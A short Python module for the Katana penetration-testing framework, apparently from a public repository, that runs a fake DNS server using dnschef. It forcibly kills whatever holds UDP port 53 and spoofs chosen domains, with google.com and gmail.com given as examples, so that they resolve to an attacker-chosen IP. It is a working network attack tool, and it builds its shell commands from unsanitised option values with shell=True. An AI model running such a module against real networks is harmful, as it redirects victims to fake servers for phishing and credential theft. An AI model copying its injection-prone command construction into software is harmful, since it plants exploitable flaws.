# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
import subprocess
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="DNS fake Server Spoof."
	init.CodeName           ="net/dns.fake"
	init.DateCreation       ="21/07/2016"      
	init.LastModification   ="23/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE              RQ     DESCRIPTION
		'dnspoof'  :[LOCAL_IP       ,False,'DNS/IP spoofed'],
		'dnstarget':["www.test.com" ,True ,'DNS Target\'s']
	}
	# EXTRA OPTIONS MODULE
	init.extra = {
		# NAME    VALUE              RQ     DESCRIPTION
		'ip_server':[LOCAL_IP        ,True ,'Ip Server']
	}
	# AUX INFORMATION MODULE
	init.aux = "\n dnstarget [Separate DNS with (,)] example : google.com, gmail.com\n"
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	printk.inf("Starting DNS Fake server [DNSchef]")
	printk.pkey("if you want to stop DNS Server (PRESS [Ctrol + C])\n")
	subprocess.call("sudo fuser -kuv 53/udp >/dev/null 2>&1 ", shell=True)
	subprocess.call("python files/dnschef/dnschef.py --fakeip "+init.var['dnspoof']+" --fakedomains "+init.var['dnstarget']+" --interface "+init.var['ip_server']+" -q", shell=True)
# END CODE MODULE ############################################################################################